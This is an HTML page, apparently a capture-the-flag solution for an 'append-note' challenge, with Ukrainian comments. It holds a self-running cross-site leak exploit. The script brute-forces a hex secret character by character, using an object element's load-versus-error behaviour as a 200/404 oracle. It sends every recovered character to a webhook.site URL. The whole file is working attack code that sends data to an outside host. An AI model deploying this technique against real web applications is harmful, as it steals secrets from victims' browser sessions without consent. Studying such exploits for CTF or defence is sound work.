<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Exploit</title>
</head>
<body>
    <div id="status">Starting exploit...</div>
    <div id="result">Progress: </div>

    <script>
        const TARGET = "https://append-note-qy52d.instancer.lac.tf/";
        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59"; // Замініть на свій Webhook.site
        const ALPHABET = "0123456789abcdef";
        let secret = "";

        async function log(msg) {
            console.log(msg);
            document.getElementById('result').innerText += msg + " ";
            await fetch(`${WEBHOOK}?data=${msg}`);
        }

        function testChar(char) {
            return new Promise((resolve) => {
                const probe = document.createElement('object');
                // Використовуємо об'єкт для перевірки статусу 200 vs 404
                // Параметр url має бути валідним хостом завдання 
                probe.data = `${TARGET}/append?content=${secret}${char}&url=${TARGET}/`;
                
                // Якщо 200 OK (префікс вірний)
                probe.onload = () => {
                    document.body.removeChild(probe);
                    resolve(true);
                };
                
                // Якщо 404 Not Found (префікс невірний) 
                probe.onerror = () => {
                    document.body.removeChild(probe);
                    resolve(false);
                };

                // Додаємо в DOM, щоб ініціювати запит
                document.body.appendChild(probe);
                
                // Тайм-аут на випадок підвисання
                setTimeout(() => resolve(false), 1000);
            });
        }

        async function run() {
            for (let i = 0; i < 8; i++) { // Секрет має довжину 8 
                for (let char of ALPHABET) {
                    document.getElementById('status').innerText = `Testing: ${secret}${char}`;
                    const found = await testChar(char);
                    if (found) {
                        secret += char;
                        await log(`Found_char:_${char}_Current:_${secret}`);
                        break;
                    }
                }
            }
            await log(`Final_Secret:_${secret}`);
            // Тепер можна отримати флаг:
            // window.location = `${TARGET}/flag?secret=${secret}`;
        }

        // Запускаємо автоматично при завантаженні
        window.onload = run;
    </script>
</body>
</html>